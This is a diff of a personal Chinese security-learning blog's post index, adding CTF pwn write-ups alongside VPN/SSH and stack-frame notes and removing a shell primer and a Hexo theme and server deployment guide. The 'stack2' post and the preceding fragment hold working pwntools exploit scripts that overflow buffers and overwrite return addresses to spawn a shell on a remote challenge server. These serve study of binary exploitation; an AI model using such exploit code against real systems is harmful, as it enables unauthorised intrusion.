+<p>不过v2距离栈底 0x74 所以构造函数不应该是0x78*”a”+p32(adress)吗<br>但我试过之后发现并不能得到flag</p>
+<p>为什么呢？<br>我也不太清楚。</p>
+<p>下面是为什么用32*”A”的原因</p>
+<p>重点</p>
+<h3 id="代码的最后有-amp-v3-–v14"><a href="#代码的最后有-amp-v3-–v14" class="headerlink" title="代码的最后有(*(&amp;v3+ –v14))();"></a>代码的最后有(*(&amp;v3+ –v14))();</h3><pre><code>v3是int型指针  v14是int数据
+所以这句代码就是 执行 v3加上 v14-1后  所指向的  函数
+因此我们可以用这一句来进行溢出，执行我们找到的 后门函数
+分析代码当v2的值等于‘A’ 时 v14等于 1 所以最后执行v3指向的函数
+可以发现v3距离v2 0x20 也就是32，然后将v3覆盖为后门函数</code></pre><p>后面为了验证正确性，我将v2改为字符’9’ 得到v14为 2</p>
+<p>因此我用下面的脚本验证发现也可行</p>
+<pre><code>#coding:utf-8
+from pwn import *
+
+p=remote(&apos;111.198.29.45&apos;,39341)
+print p.recvuntil(&quot;&gt; &quot;)
+p.sendline(&apos;A&apos;)
+payload=&apos;9&apos;*36+p32(0x080486cc)
+print p.recvuntil(&quot;&gt; &quot;)
+p.sendline(payload)
+print p.recvall()</code></pre><p> 这题中收获还是不小的，起码读懂了代码的执行步骤。<br>希望大家在做题的过程中也能多多发现疑问，<br>使自己做题时知其所以</p>
+]]></content>
+      <tags>
+        <tag>做题题解</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>stack2</title>
+    <url>/2019/10/11/stack2/</url>
+    <content><![CDATA[<p>1.file命令查看为32位</p>
+<p>2.checksec命令查看保护机制<br><img alt data-src="/2019/10/11/stack2/2.png" class="lazyload"></p>
+<p>由保护机制我想到的做本题的方法<br>（1）绕过canary保护<br>（2）rop链控制执行流</p>
+<p>3.做题首先运行一下，查看程序的运行过程</p>
+<p><img alt data-src="/2019/10/11/stack2/1.png" class="lazyload"></p>
+<p>因为做题的关键就在输入输出，本题的输入的作用显而易见，5个选项输入。因此我们可以查看伪c代码并多多观察输入的位置，查看是否有漏洞可以利用。</p>
+<p><img alt data-src="/2019/10/11/stack2/3.png" class="lazyload"></p>
+<p>查看字符串列表发现了熟悉的system函数与、bin/bash<br>可以考虑使用覆盖返回地址，但本题开了保护，不能直接栈溢出，所以接着看伪代码。</p>
+<p><img alt data-src="/2019/10/11/stack2/4.png" class="lazyload"></p>
+<p>在这里可以看到，没有限制v5的值，也就是我们可以通过这个更改距离v13任意位置的值设为v7，即通过两次输入更改值，那我们是否可以直接找到返回地址的位置并且改为system 的地址呢？<br>很明显是可以的。那么偏移是多少呢？</p>
+<p><img alt data-src="/2019/10/11/stack2/5.png" class="lazyload"></p>
+<p>v13距离栈底0x70<br>所以距离是不是就是0x70+0x4呢？<br>大家可以先思考一下。</p>
+<p>这里查询到返回地址和输入的地址。就可以利用差值得出结果0x84<br>但是不知道为什么0x74却不行</p>
+<p>这一题在覆盖返回地址时因为更改的数组的单个字节。是所以要用到多次写入。</p>
+<p>本题需要知道小端模式，现代计算机通常使用的一种内存排列格式</p>
+<p><img alt data-src="/2019/10/11/stack2/6.png" class="lazyload"><br>下面是脚本</p>
+<pre><code>#!/usr/bin/python
+#coding:utf-8
+
+from pwn import*
+
+
+
+
+
+
+system_addr=0x080485AF
+leave_offset=0x84
+
+
+def write_addr(addr,va):
+    io.sendline(&quot;3&quot;)
+    io.recvuntil(&quot;which number to change:\n&quot;)
+    io.sendline(str(addr))
+    io.recvuntil(&quot;new number:\n&quot;)
+    io.sendline(str(va))
+    io.recvuntil(&quot;5. exit\n&quot;)
+
+io=remote(&apos;111.198.29.45&apos;,&apos;31725&apos;)
+io.recvuntil(&quot;How many numbers you have:\n&quot;)
+io.sendline(&quot;1&quot;)
+io.recvuntil(&quot;Give me your numbers\n&quot;)
+io.sendline(&quot;1&quot;)
+io.recvuntil(&quot;5. exit\n&quot;)
+
+
+# write  system_addr  0x08048450
+
+write_addr(leave_offset,0X50)
+write_addr(leave_offset+1,0X84)
+write_addr(leave_offset+2,0X04)
+write_addr(leave_offset+3,0X08)
+# sh_addr  0x08048987
+leave_offset+=8
+print leave_offset
+write_addr(leave_offset,0x87)
+write_addr(leave_offset+1,0X89)
+write_addr(leave_offset+2,0X04)
+write_addr(leave_offset+3,0X08)
+
+io.sendline(&quot;5&quot;)
+io.interactive()    </code></pre>]]></content>
+      <tags>
+        <tag>做题题解</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>vpn&amp;ssh</title>
+    <url>/2020/05/17/vpn-ssh/</url>
+    <content><![CDATA[<h1 id="vpn"><a href="#vpn" class="headerlink" title="vpn"></a>vpn</h1><blockquote>
+<p> <strong>虚拟私人网络</strong>（英语：<strong>V</strong>irtual <strong>P</strong>rivate <strong>N</strong>etwork，缩写：<strong>VPN</strong>）是一种常用于连接中、大型企业或团体与团体间的私人网络的通讯方法。它利用<a href="https://zh.wikipedia.org/wiki/隧道协议" target="_blank" rel="noopener">隧道协议</a>（Tunneling Protocol）来达到发送端认证、消息保密与准确性等功能</p>
+</blockquote>
+<ul>
+<li>虚拟专用网络(VPN)的功能是：在公用网络上建立专用网络，进行加密通讯</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">让外地员工访问到内网资源，利用VPN的解决方法就是在内网中架设一台VPN服务器</span><br><span class="line">外地员工在当地连上互联网后，通过互联网连接VPN服务器，然后通过VPN服务器进入企业内网。</span><br><span class="line"></span><br><span class="line">为了保证数据安全，VPN服务器和客户机之间的通讯数据都进行了加密处理。</span><br><span class="line">有了数据加密，就可以认为数据是在一条专用的数据链路上进行安全传输，</span><br><span class="line">就如同专门架设了一个专用网络一样，</span><br><span class="line"></span><br><span class="line">但实际上VPN使用的是互联网上的公用链路，因此VPN称为虚拟专用网络，</span><br><span class="line">其实质上就是利用加密技术在公网上封装出一个数据通讯隧道。</span><br></pre></td></tr></table></figure>
+
+<h2 id="大致原理"><a href="#大致原理" class="headerlink" title="大致原理"></a>大致原理</h2><ol>
+<li>就是在通信双方中间加了一个转发消息的服务器</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">举例来说，一个人想要打开Google，如果不用VPN，他的电脑就直接去连Google的网站。而开启VPN以后，如果他想打开Google，他的电脑就不再直接连接Google网站，而是去连接VPN服务器，并给VPN服务器发一条指令——“我要访问Google”。VPN服务器接到指令后，自己去访问Google，收到Google网页的内容，再把内容回传给员工，这样使用VPN的员工最终就能看到Google网站的内容了</span><br><span class="line"></span><br><span class="line">VPN还有一个重要特点：VPN用户和VPN服务器之间的通讯是加密的</span><br></pre></td></tr></table></figure>
+
+<h1 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h1><ul>
+<li>SSH是一种网络协议，用于计算机之间的加密登录</li>
+</ul>
+<p>SSH最初是UNIX系统上的一个程序，后来又迅速扩展到其他操作平台。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SSH是由客户端和服务端的软件组成的</span><br><span class="line"></span><br><span class="line">服务端是一个守护进程(daemon)，他在后台运行并响应来自客户端的连接请求。</span><br><span class="line">服务端一般是sshd进程，提供了对远程连接的处理，</span><br><span class="line">一般包括公共密钥认证、密钥交换、对称密钥加密和非安全连接</span><br><span class="line"></span><br><span class="line">客户端包含ssh程序以及像scp（远程拷贝）、slogin（远程登陆）、sftp（安全文件传输）等其他的应用程序。</span><br><span class="line"></span><br><span class="line">工作机制大致是本地的客户端发送一个连接请求到远程的服务端，服务端检查申请的包和IP地址再发送密钥给SSH的客户端，本地再将密钥发回给服务端，自此连接建立</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SSH（代表“安全shell”）不是专为转发网络流量而设计的。 一般情况下，SSH用于安全地获取和使用远程终端会话-但SSH有其他用途 。 SSH还使用强加密，您可以将SSH客户端设置为SOCKS代理。 完成后，您可以在计算机上配置应用程序（如Web浏览器）以使用SOCKS代理。 流量进入在本地系统上运行的SOCKS代理，SSH客户端通过SSH连接转发它 - 这被称为SSH隧道。 这类似于通过VPN浏览网络 - 从网络服务器的角度来看，您的流量似乎来自SSH服务器。 计算机和SSH服务器之间的流量已加密，因此您可以通过加密连接浏览，就像使用VPN一样。</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>网络</category>
+      </categories>
+      <tags>
+        <tag>vpn</tag>
+        <tag>ssh</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>stack</title>
+    <url>/2019/09/27/stack_explain/</url>
+    <content><![CDATA[<a id="more"></a>
+
+
+<p>这段时间看了不少的东西。<br>下面写一下对栈的一些理解：</p>
+<pre><code>Stack 是由内存区域的结束地址开始，从高位（地址）向低位（地址）分配。</code></pre><p>栈顶：esp<br>栈底：ebp</p>
+<p>在函数运行时，会开辟栈帧，一些数据被存进去</p>
+<pre><code>push   ebp       压栈 esp减小 存入ebp内容
+mov    ebp,esp        </code></pre><p>根据约定，程序从_main标签开始执行，这时会在 Stack 上为main建立一个栈帧，<br>并将 Stack 所指向的地址，写入 ESP 寄存器。<br>后面如果有数据要写入main这个帧，就会写在 ESP 寄存器所保存的地址。</p>
+<p>一个栈帧从高地址到低地址应该是</p>
+<pre><code>函数参数
+函数返回地址
+ebp                #这里到下面是一个栈帧，执行完后会执行返回地址里的内容
+栈内数据
+esp  </code></pre><p>待更新。。</p>
+]]></content>
+      <tags>
+        <tag>有关栈</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>python基本数据类型</title>
     <url>/2019/08/08/python/</url>
     <content><![CDATA[<a id="more"></a>
@@ -547,98 +694,6 @@ for key in info:
       </tags>
   </entry>
   <entry>
-    <title>shell</title>
-    <url>/2019/10/09/shell/</url>
-    <content><![CDATA[<p>#shell （计算机壳层）<br>在计算机科学中，Shell俗称壳（用来区别于核），是指“为使用者提供操作界面”的软件（命令解析器）。它类似于DOS下的command.com和后来的cmd.exe。它接收用户命令，然后调用相应的应用程序。</p>
-<p>同时它又是一种程序设计语言。作为命令语言，它交互式解释和执行用户输入的命令或者自动地解释和执行预先设定好的一连串的命令；作为程序设计语言，它定义了各种变量和参数，并提供了许多在高级语言中才具有的控制结构，包括循环和分支。<br>在排序算法中，Shell是希尔排序的名称。</p>
-<p>#基本上shell分两大类：</p>
-<p>###一：图形界面shell（Graphical User Interface shell 即 GUI shell）<br>例如：应用最为广泛的 Windows Explorer （微软的windows系列操作系统），还有也包括广为人知的 Linux shell，其中linux shell 包括 X window manager (BlackBox和FluxBox），以及功能更强大的CDE、GNOME、KDE、 XFCE。</p>
-<p>###二：命令行式shell（Command Line Interface shell ，即CLI shell）<br>例如：<br>bash / sh / ksh / csh（Unix/linux 系统）<br>（MS-DOS系统）<br>cmd.exe/ 命令提示字符（Windows NT 系统）<br>Windows PowerShell（支持 .NET Framework 技术的 Windows NT 系统）</p>
-<pre><code>传统意义上的shell指的是命令行式的shell，以后如果不特别注明，shell是指命令行式的shell。
-
-文字操作系统与外部最主要的接口就叫做shell。
-shell是操作系统最外面的一层。
-shell管理你与操作系统之间的交互：
-等待你输入，向操作系统解释你的输入，
-并且处理各种各样的操作系统的输出结果。</code></pre><p>shell提供了你与操作系统之间通讯的方式。这种通讯可以以交互方式（从键盘输入，并且可以立即得到响应），或者以shell script(非交互）方式执行。shell script是放在文件中的一串shell和操作系统命令，它们可以被重复使用。本质上，shell script是命令行命令简单的组合到一个文件里面。</p>
-<p>Shell基本上是一个命令解释器，类似于DOS下的command。它接收用户命令（如ls等），然后调用相应的应用程序。较为通用的shell有标准的Bourne shell (sh）和C shell (csh）。</p>
-<p>###交互式shell和非交互式shell</p>
-<p>交互式模式就是shell等待你的输入，并且执行你提交的命令。这种模式被称作交互式是因为shell与用户进行交互。这种模式也是大多数用户非常熟悉的：登录、执行一些命令、签退。当你签退后，shell也终止了。<br>shell也可以运行在另外一种模式：非交互式模式。在这种模式下，shell不与你进行交互，而是读取存放在文件中的命令，并且执行它们。当它读到文件的结尾，shell也就终止了。</p>
-]]></content>
-      <tags>
-        <tag>计算机基础概念</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>stack2</title>
-    <url>/2019/10/11/stack2/</url>
-    <content><![CDATA[<p>1.file命令查看为32位</p>
-<p>2.checksec命令查看保护机制<br><img alt data-src="/2019/10/11/stack2/2.png" class="lazyload"></p>
-<p>由保护机制我想到的做本题的方法<br>（1）绕过canary保护<br>（2）rop链控制执行流</p>
-<p>3.做题首先运行一下，查看程序的运行过程</p>
-<p><img alt data-src="/2019/10/11/stack2/1.png" class="lazyload"></p>
-<p>因为做题的关键就在输入输出，本题的输入的作用显而易见，5个选项输入。因此我们可以查看伪c代码并多多观察输入的位置，查看是否有漏洞可以利用。</p>
-<p><img alt data-src="/2019/10/11/stack2/3.png" class="lazyload"></p>
-<p>查看字符串列表发现了熟悉的system函数与、bin/bash<br>可以考虑使用覆盖返回地址，但本题开了保护，不能直接栈溢出，所以接着看伪代码。</p>
-<p><img alt data-src="/2019/10/11/stack2/4.png" class="lazyload"></p>
-<p>在这里可以看到，没有限制v5的值，也就是我们可以通过这个更改距离v13任意位置的值设为v7，即通过两次输入更改值，那我们是否可以直接找到返回地址的位置并且改为system 的地址呢？<br>很明显是可以的。那么偏移是多少呢？</p>
-<p><img alt data-src="/2019/10/11/stack2/5.png" class="lazyload"></p>
-<p>v13距离栈底0x70<br>所以距离是不是就是0x70+0x4呢？<br>大家可以先思考一下。</p>
-<p>这里查询到返回地址和输入的地址。就可以利用差值得出结果0x84<br>但是不知道为什么0x74却不行</p>
-<p>这一题在覆盖返回地址时因为更改的数组的单个字节。是所以要用到多次写入。</p>
-<p>本题需要知道小端模式，现代计算机通常使用的一种内存排列格式</p>
-<p><img alt data-src="/2019/10/11/stack2/6.png" class="lazyload"><br>下面是脚本</p>
-<pre><code>#!/usr/bin/python
-#coding:utf-8
-
-from pwn import*
-
-
-
-
-
-
-system_addr=0x080485AF
-leave_offset=0x84
-
-
-def write_addr(addr,va):
-    io.sendline(&quot;3&quot;)
-    io.recvuntil(&quot;which number to change:\n&quot;)
-    io.sendline(str(addr))
-    io.recvuntil(&quot;new number:\n&quot;)
-    io.sendline(str(va))
-    io.recvuntil(&quot;5. exit\n&quot;)
-
-io=remote(&apos;111.198.29.45&apos;,&apos;31725&apos;)
-io.recvuntil(&quot;How many numbers you have:\n&quot;)
-io.sendline(&quot;1&quot;)
-io.recvuntil(&quot;Give me your numbers\n&quot;)
-io.sendline(&quot;1&quot;)
-io.recvuntil(&quot;5. exit\n&quot;)
-
-
-# write  system_addr  0x08048450
-
-write_addr(leave_offset,0X50)
-write_addr(leave_offset+1,0X84)
-write_addr(leave_offset+2,0X04)
-write_addr(leave_offset+3,0X08)
-# sh_addr  0x08048987
-leave_offset+=8
-print leave_offset
-write_addr(leave_offset,0x87)
-write_addr(leave_offset+1,0X89)
-write_addr(leave_offset+2,0X04)
-write_addr(leave_offset+3,0X08)
-
-io.sendline(&quot;5&quot;)
-io.interactive()    </code></pre>]]></content>
-      <tags>
-        <tag>做题题解</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ubuntu16.04配置</title>
     <url>/2019/10/11/ubuntu16-04%E9%85%8D%E7%BD%AE/</url>
     <content><![CDATA[<p>由于在使用虚拟机过程中有时会出现莫名的错误，我就因为网络等问题重新安装了虚拟机及镜像，顺便整理了一下ubuntu基本配置的安装过程</p>
@@ -678,28 +733,6 @@ sudo gedit pip.conf
 ]]></content>
       <tags>
         <tag>虚拟机配置</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>stack</title>
-    <url>/2019/09/27/stack_explain/</url>
-    <content><![CDATA[<a id="more"></a>
-
-
-<p>这段时间看了不少的东西。<br>下面写一下对栈的一些理解：</p>
-<pre><code>Stack 是由内存区域的结束地址开始，从高位（地址）向低位（地址）分配。</code></pre><p>栈顶：esp<br>栈底：ebp</p>
-<p>在函数运行时，会开辟栈帧，一些数据被存进去</p>
-<pre><code>push   ebp       压栈 esp减小 存入ebp内容
-mov    ebp,esp        </code></pre><p>根据约定，程序从_main标签开始执行，这时会在 Stack 上为main建立一个栈帧，<br>并将 Stack 所指向的地址，写入 ESP 寄存器。<br>后面如果有数据要写入main这个帧，就会写在 ESP 寄存器所保存的地址。</p>
-<p>一个栈帧从高地址到低地址应该是</p>
-<pre><code>函数参数
-函数返回地址
-ebp                #这里到下面是一个栈帧，执行完后会执行返回地址里的内容
-栈内数据
-esp  </code></pre><p>待更新。。</p>
-]]></content>
-      <tags>
-        <tag>有关栈</tag>
       </tags>
   </entry>
   <entry>
@@ -785,178 +818,6 @@ esp  </code></pre><p>待更新。。</p>
     <title>链接</title>
     <url>/2019/11/05/%E9%93%BE%E6%8E%A5/</url>
     <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title>hexo Butterfly主题配置及部署到服务器</title>
-    <url>/2020/04/06/hexo%E4%B8%BB%E9%A2%98%E6%90%AD%E5%BB%BA/</url>
-    <content><![CDATA[<h1 id="安装Butterfly主题与配置"><a href="#安装Butterfly主题与配置" class="headerlink" title="安装Butterfly主题与配置"></a>安装Butterfly主题与配置</h1><figure class="highlight"><table><tr><td class="code"><pre><span class="line">这个主题还是很不错的，我花了一个多礼拜的时间来搞。</span><br><span class="line">说明：我安装的是2.0.0版本的，因为以上版本我本地'hexo g'会出错</span><br></pre></td></tr></table></figure>
-
-<h2 id="主题安装"><a href="#主题安装" class="headerlink" title="主题安装"></a>主题安装</h2><p><a href="https://github.com/jerryc127/hexo-theme-butterfly/releases" target="_blank" rel="noopener">资源链接</a> </p>
-<p>直接点击下载比git clone要快的多，下载后解压到<code>hexo themes</code>目录下</p>
-<blockquote>
-<p>我主要将一些问题，配置说一下，要具体配置看<strong>相关博文链接</strong></p>
-</blockquote>
-<h2 id="hexo各目录作用"><a href="#hexo各目录作用" class="headerlink" title="hexo各目录作用"></a>hexo各目录作用</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── _config.yml      <span class="comment">// 站点配置文件</span></span><br><span class="line">├── db.json          <span class="comment">// 缓存文件</span></span><br><span class="line">├── node_modules     <span class="comment">// 安装的插件以及hexo所需的一些nodejs模块</span></span><br><span class="line">├── package.json     <span class="comment">// 项目的依赖文件</span></span><br><span class="line">├── scaffolds        <span class="comment">// 模版文件	</span></span><br><span class="line">	-draft.md						</span><br><span class="line">	-page.md						</span><br><span class="line">	-post.md</span><br><span class="line">├── source           <span class="comment">// 源文件，用来存放你的文章 md 文件</span></span><br><span class="line">	-_posts</span><br><span class="line">└── themes           <span class="comment">// 主题文件</span></span><br></pre></td></tr></table></figure>
-
-<p>hexo new <file> 默认是post.md，一般放在source中<code>_posts</code>目录，我们写作的博客都在这里。</file></p>
-<p>​    可以在<code>post.md</code>中设置自动生成的博客的格式</p>
-<p>主题下载到themes目录下</p>
-<h2 id="主题目录"><a href="#主题目录" class="headerlink" title="主题目录"></a>主题目录</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── LICENSE</span><br><span class="line">├── README.en.md       <span class="comment">// READEME 英文版</span></span><br><span class="line">├── README.md          <span class="comment">// READEME 中文文件</span></span><br><span class="line">├── _config.yml        <span class="comment">// 主题配置文件</span></span><br><span class="line">├── languages         <span class="comment">// 多语言配置文件 可以在hexo的_config.yml中配置</span></span><br><span class="line">├── layout            <span class="comment">// 模板文件</span></span><br><span class="line">├── package.json      <span class="comment">// 项目的依赖文件</span></span><br><span class="line">├── scripts           <span class="comment">// 主题的脚本文件</span></span><br><span class="line">├── source            <span class="comment">// 主题的资源文件 CSS IMG</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="Hexo-的工作原理"><a href="#Hexo-的工作原理" class="headerlink" title="Hexo 的工作原理"></a>Hexo 的工作原理</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">hexo g：</span><br><span class="line">    生成静态文件。</span><br><span class="line">    将我们的数据和界面相结合生成静态文件的过程。</span><br><span class="line">    会遍历主题文件中的 source 文件夹（js、css、img 等静态资源），然后建立索引，然后根据索引生成 pubild 文件夹中，此时的 <span class="keyword">public</span> 文件是由 html、 js、css、img 建立的纯静态文件可以通过 index.html 作为入口访问你的博客。</span><br><span class="line">hexo d：</span><br><span class="line">    部署文件。</span><br><span class="line">    部署主要是根据在 _config.yml 中配置的 git 仓库或者 coding 的地址，将 <span class="keyword">public</span> 文件上传至 github 或者 coding 中。</span><br><span class="line">    然后再根据上面的 github 提供的 pages 服务呈现出页面。当然你也可以直接将你生成的 <span class="keyword">public</span> 文件上传至你自己的服务器上。</span><br></pre></td></tr></table></figure>
-
-<p>hexo大概就是将本地的文件，经过加工生成html文件。最后可上传到github或服务器上进行访问</p>
-<h2 id="主题配置"><a href="#主题配置" class="headerlink" title="主题配置"></a>主题配置</h2><h3 id="菜单的配置"><a href="#菜单的配置" class="headerlink" title="菜单的配置"></a>菜单的配置</h3><p><img alt data-src="https://i.loli.net/2020/04/06/FEwlX7jhDmV4oAq.png" class="lazyload"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">:前面是显示的菜单名称</span><br><span class="line">|| 后面写图标名称 菜单图标可在网址里找 https://fontawesome.com/?from=io </span><br><span class="line">列表下面那种是分级目录</span><br></pre></td></tr></table></figure>
-
-<h3 id="创建page-tag等"><a href="#创建page-tag等" class="headerlink" title="创建page tag等"></a>创建page tag等</h3><p>刚开始，标签，分类，友链等都是没有界面的，所以用到命令</p>
-<p> <code>hexo new page &#39;name&#39;</code></p>
-<p>在hexo主目录中输入命令，会在<code>source</code>下出现相应目录</p>
-<p><code>tags</code>的配置</p>
-<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">title: 标签</span><br><span class="line">date: 2020-04-03 16:20:50</span><br><span class="line">type: "tags"</span><br><span class="line">top_img:</span><br></pre></td></tr></table></figure>
-
-<p>top_img可以设置对应菜单下的图片,可以用图床生成图片链接</p>
-<p><code>link</code>的配置</p>
-<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">title: link</span><br><span class="line">date: 2020-04-05 17:34:13</span><br><span class="line">type: "link"</span><br><span class="line">top_img: https://i.loli.net/2020/04/05/hDjZveqHTd1LWsI.png</span><br></pre></td></tr></table></figure>
-
-<p><code>categories</code>的配置</p>
-<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">title: 分类</span><br><span class="line">date: 2020-04-03 16:20:21</span><br><span class="line">type: "categories"</span><br><span class="line">top_img:</span><br></pre></td></tr></table></figure>
-
-<h3 id="友链的设置"><a href="#友链的设置" class="headerlink" title="友链的设置"></a>友链的设置</h3><p>在hexo的source目录生成 <code>_data</code>里面生成<code>link.yml</code>文件</p>
-<p>文件内容</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span>:</span></span><br><span class="line">  class_name: 友情链接</span><br><span class="line">  link_list:</span><br><span class="line">    <span class="number">1</span>:</span><br><span class="line">      name: <span class="comment">#名称</span></span><br><span class="line">      link: <span class="comment">#博客链接</span></span><br><span class="line">      avatar: <span class="comment">#头像</span></span><br><span class="line">      descr: <span class="comment">#描述</span></span><br><span class="line">    <span class="number">2</span>:</span><br><span class="line">      name:</span><br><span class="line">      link: </span><br><span class="line">      avatar: </span><br><span class="line">      descr:</span><br></pre></td></tr></table></figure>
-
-<p>另外在主题的配置文件中Flink下设置自己的资料</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"># 友情鏈接界面設置</span><br><span class="line">Flink:</span><br><span class="line">  headline: 友情链接</span><br><span class="line">  info_headline: 我的Blog资料</span><br><span class="line">  name: Blog 名字： zzl14</span><br><span class="line">  address: Blog 地址： https:<span class="comment">//www.zzl14.xyz/link/</span></span><br><span class="line">  avatar: Blog 主题： Butterfly</span><br><span class="line">  info: Blog 简介： 日常学习总结</span><br><span class="line">  comment: 交换友链,请留言</span><br></pre></td></tr></table></figure>
-
-<p>界面如下<img alt="QQ截图20200406151505.png" data-src="https://i.loli.net/2020/04/06/TsqmJpDIulwQeCF.png" class="lazyload"></p>
-<h3 id="文章的图片设置"><a href="#文章的图片设置" class="headerlink" title="文章的图片设置"></a>文章的图片设置</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">title: &#123;&#123; title &#125;&#125;</span><br><span class="line">date: &#123;&#123; date &#125;&#125;</span><br><span class="line">category: &#123;&#123; category &#125;&#125;</span><br><span class="line">tags:</span><br><span class="line">top_img: <span class="comment">#文章顶部图片路径</span></span><br><span class="line">cover: <span class="comment">#封面路径</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="搜索框的设置"><a href="#搜索框的设置" class="headerlink" title="搜索框的设置"></a>搜索框的设置</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">local_search:</span><br><span class="line">  enable: true <span class="comment">#主题配置中设置为true,并在hexo主目录使用如下命令下载依赖，</span></span><br><span class="line">    </span><br><span class="line">npm install hexo-generator-search --save</span><br></pre></td></tr></table></figure>
-
-<p>具体配置过程可能艰辛，但是慢慢来。</p>
-<h1 id="相关博文链接"><a href="#相关博文链接" class="headerlink" title="相关博文链接"></a>相关博文链接</h1><p><a href="https://ciweigg2.github.io/2019/07/04/hexo-theme-butterfly-zhu-ti-an-zhuang-ya/#toc-heading-5" target="_blank" rel="noopener">详细博文1</a></p>
-<p><a href="http://www.c-hasel.cn/2019/12/01/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%BA%8C/#%E5%AF%BC%E8%88%AA%E8%8F%9C%E5%8D%95" target="_blank" rel="noopener">详细博文2</a></p>
-<p><a href="http://yearito.cn/posts/hexo-get-started.html" target="_blank" rel="noopener">系列博文</a></p>
-<h1 id="hexo部署到服务器"><a href="#hexo部署到服务器" class="headerlink" title="hexo部署到服务器"></a>hexo部署到服务器</h1><p>由于github仓库的访问速度可能较慢，可能有必要搭建到服务器上进行访问。</p>
-<p>但是之后感觉其实没有太大必要</p>
-<p>先放一幅原理图（<a href="https://www.jianshu.com/p/e1ccd49b4e5d" target="_blank" rel="noopener">别人博客</a>的）</p>
-<p><img alt data-src="https://i.loli.net/2020/04/06/GPlK9CujERi4mk3.png" class="lazyload"></p>
-<p>所以我们需要在服务器搭建git仓库，下载Nginx，通过hooks将仓库部署到网站</p>
-<p>大致思路是</p>
-<p>1.本地上传到服务器的git仓库</p>
-<p>2.通过git仓库的hooks（钩子）将文件放到服务器的网站根目录（自己设置）</p>
-<p>3.通过Nginx将网站根目录的内容在公网ip进行展示</p>
-<blockquote>
-<p>安装nginx</p>
-<p>创建git用户</p>
-</blockquote>
-<h2 id="安装Nginx"><a href="#安装Nginx" class="headerlink" title="安装Nginx"></a>安装Nginx</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh root@ip		#登录服务器</span><br><span class="line"></span><br><span class="line">sudo apt-get install nginx	(有时要用到 sudo apt-get update)</span><br><span class="line"><span class="meta">	#</span><span class="bash"> 或者</span></span><br><span class="line">sudo apt-get install apache2</span><br></pre></td></tr></table></figure>
-
-<h2 id="新建git用户"><a href="#新建git用户" class="headerlink" title="新建git用户"></a>新建git用户</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo adduser git		#新建git用户，下面会输入</span><br></pre></td></tr></table></figure>
-
-<h3 id="建立服务器端git仓库"><a href="#建立服务器端git仓库" class="headerlink" title="建立服务器端git仓库"></a>建立服务器端git仓库</h3><blockquote>
-<p>可以在hexo bash上上传到仓库</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo mkdir /zzl   # 创建个人git目录</span><br><span class="line">$ cd /zzl</span><br><span class="line">$ sudo mkdir blog.git  # 创建仓库</span><br><span class="line">$ cd blog.git</span><br><span class="line">$ sudo git init --bare # 初始化仓库</span><br></pre></td></tr></table></figure>
-
-<h3 id="建立网站根目录"><a href="#建立网站根目录" class="headerlink" title="建立网站根目录"></a>建立网站根目录</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo mkdir -p /home/git/hexo</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="改目录权限"><a href="#改目录权限" class="headerlink" title="改目录权限"></a>改目录权限</h3><blockquote>
-<p>因为在hexo的配置文件中repo选项是通过git进行上传</p>
-<p>所以要把目录权限给到git，并将用户目录权限改为775，即允许git用户写入</p>
-</blockquote>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo chown -R git:git /zzl /home/git/hexochmod -R git 775</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> chmod -R git 775</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="编辑hook函数"><a href="#编辑hook函数" class="headerlink" title="编辑hook函数"></a>编辑hook函数</h3><blockquote>
-<p>将上传到仓库的文件转到网站根目录</p>
-</blockquote>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> vim /zzl/blog.git/hooks/post-receive</span></span><br></pre></td></tr></table></figure>
-
-<p>填入以下内容</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">git --work-tree=/home/git/hexo --git-dir=/zzl/blog.git checkout -f</span><br></pre></td></tr></table></figure>
-
-<h3 id="在本地hexo-bash测试"><a href="#在本地hexo-bash测试" class="headerlink" title="在本地hexo bash测试"></a>在本地hexo bash测试</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git@your_server_ip:/zzl/blog.git</span><br></pre></td></tr></table></figure>
-
-<blockquote>
